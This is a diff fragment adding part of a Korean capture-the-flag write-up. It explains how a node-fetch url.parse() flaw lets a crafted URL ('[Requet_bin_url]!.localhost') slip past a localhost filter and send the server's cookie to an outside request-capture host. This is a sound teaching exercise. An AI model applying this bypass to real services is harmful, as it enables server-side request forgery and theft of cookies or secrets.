@@ -68,4 +68,18 @@ line 11~14 에서는 if (host !== "localhost" && !host.endsWith("localhost")) �
 
 먼저 url 파라미터에 값 입력 시 localhost 필터링을 우회하여야 하는데 검색해서 찾은 여러 우회 방법을 시도해본 결과 실패하였다. 계속 방법을 찾던 와중에  이 웹페이지가 Node.js로 작성되어있다는 점을 생각하고 Node.js에서 이와 관련된 취약점이 없었는지를 검색하였고, 이와 [유사한 취약점](https://toss.tech/article/nodejs-security-contribution)에 대한 글을 찾을 수 있었다.
 
+글 내용에 의하면 node-fetch 라이브러리에서 인자로 받은 url을 url.parse() 를 통해 파싱하는데 이 parse() 함수에서 취약점이 발생하였다고 한다. 따라서 다음과 같이 url 값을 주면 필터링을 우회할 수 있다.
 
+```
+/fetch?url=[Requet_bin_url]!.localhost
+```
+
+![image](./images/5_수정.png)
+
+필터링을 우회할 수 있는 값을 입력하여 외부 url로 요청을 보냈으며 이 요청값에서 쿠키를 확인하여 플래그를 획득할 수 있었다.
+
+![image](./images/7_수정.png)
+
+# 4. 참고
+
+- https://toss.tech/article/nodejs-security-contribution
